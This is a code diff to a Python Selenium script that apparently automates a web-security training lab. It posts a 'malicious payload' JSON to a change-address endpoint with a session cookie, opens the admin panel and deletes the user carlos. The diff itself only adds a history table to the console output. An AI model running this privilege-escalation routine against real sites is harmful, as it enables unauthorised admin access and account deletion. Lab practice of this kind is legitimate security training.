@@ -10,6 +10,7 @@ from time import sleep
 import requests
 from rich.console import Console
 from rich.text import Text
+from rich.table import Table
 
 def pretty_print(t,color):
     text = Text()
@@ -55,8 +56,8 @@ def send_POST_to_change_address(malicious_json,cookie,LAB_URL,console):
     endpoint_POST = f"{LAB_URL}/my-account/change-address"
     headers = {"Cookie": f"session={cookie}"}
     response = requests.post(url=endpoint_POST, data=json.dumps(malicious_json), headers=headers)
-    console.print(pretty_print(f"Injected Response: {str(response.json())}","yellow"))
-    return response
+    t3 = pretty_print(f"Injected Response: {str(response.json())}","yellow")
+    return response,t3
 
 def go_to_admin_panel(driver):
     admin_button = driver.find_element("xpath", '//*[contains(text(), "Admin panel")]')
@@ -68,6 +69,8 @@ def delete_carlos(driver):
 
 def main(lab_url: str):
     c = Console()
+    table = Table()
+    table.add_column("History", style="cyan")
     driver = webdriver.Chrome()
     lab_url=lab_url.rstrip("/")
     current_url = login(driver, lab_url)
@@ -100,13 +103,19 @@ def main(lab_url: str):
         t2 = pretty_print(f"Malicious payload: {str(json_malevolo)}","red")
         c.print(t2)
         sleep(2)
-        send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
+        response,t3=send_POST_to_change_address(json_malevolo, cookie, lab_url,c)
+        c.print(t3)
         sleep(1)
         driver.refresh()
         sleep(2)
         go_to_admin_panel(driver)
         sleep(2)
+        table.add_row(t1)
+        table.add_row(t2)
+        table.add_row(t3)
+        c.print(table)
         delete_carlos(driver)
+        
         sleep(50)
 
 
